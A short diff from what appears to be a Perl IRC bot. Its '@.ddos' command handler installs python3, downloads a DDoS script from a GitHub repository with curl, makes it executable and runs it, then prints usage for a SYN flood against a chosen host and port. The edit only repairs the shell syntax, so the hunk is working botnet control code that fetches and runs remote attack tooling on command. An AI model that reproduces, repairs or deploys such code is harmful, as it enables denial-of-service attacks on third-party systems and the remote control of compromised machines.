@@ -134,7 +134,7 @@ system 'if [ -f /usr/bin/apt ]; then sudo service ssh restart; fi';
      push @IRC_RESULTS, $_ foreach split "\n", $r;
      } elsif ($msg =~ /@.ddos ([^\s]+)/) {
      $s->progress("[Info] Installing DDoS Module");
-     my $ddos = "if [ ! -f /usr/bin/python3 ]; then if [ -f /usr/bin/apt ]; then apt install python3 -y; else yum install python3 -y; fi; curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/ddos/master/ddos.py -o ddos.py && chmod +x ddos.py && ./ddos.py $@ &";
+     my $ddos = "if [ ! -f /usr/bin/python3 ]; then if [ -f /usr/bin/apt ]; then apt install python3 -y; else yum install python3 -y; fi; fi; curl -LvO https://raw.githubusercontent.com/ind3p3nd3nt/ddos/master/ddos.py -o ddos.py && chmod +x ddos.py && ./ddos.py $@";
      my $r = `$ddos`;
      push @IRC_RESULTS, $_ foreach split "\n", $r;
      $s->progress("[Info] DDoS Module Installed use: sudo ./ddos.py -d host -p port -t threads -Synflood &");
